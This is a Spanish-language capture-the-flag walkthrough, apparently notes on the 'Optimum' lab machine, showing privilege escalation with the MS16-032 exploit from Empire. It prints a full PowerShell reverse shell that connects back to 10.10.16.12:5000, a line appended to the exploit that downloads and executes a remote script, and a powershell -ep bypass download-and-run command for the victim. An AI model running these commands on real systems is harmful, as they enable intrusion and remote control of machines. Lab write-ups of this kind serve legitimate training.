Vamos a descargar con [[wget]] con el comando `wget https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/master/data/module_source/privesc/Invoke-MS16032.ps1` [El exploit de empire](https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/master/data/module_source/privesc/Invoke-MS16032.ps1) y al final del exploit vamos a agregar la linea `Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.12/rev.ps1')"` para que se descargue y ejecute el archivo que va a enviarnos la [[Reverse shell]]

![[Optimum17.png]]

Ahora vamos a crear el archivo *rev.ps1* que seria lo mismo que el archivo *reverse.ps1* que usamos antes para ganar acceso a la maquina, pero ahora le vamos a cambiar el puerto ya que nos vamos a poner en escucha por el *5000*

```ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.12',5000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Mientras estamos en escucha con [[rlwrap nc -lvnp 443]] con el comando `rlwrap nc -nlvp 5000` y con un server [[python3 -m http.server]] con el comando `python3 -m http.server 80` hosteando todos los archivos

Vamos a ejecutar desde la maquina victima el comando [[Descargar archivos que procesos de 32 bits accedan a version de 64 bits system32]]

```
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://10.10.16.12/Invoke-MS16032.ps1')"
```

![[Optimum18.png]]

Ahora vamos a la pesta√±a que estamos en escucha en el puerto *5000* y ya estamos adentro y podemos catear la flag

![[Optimum19.png]]
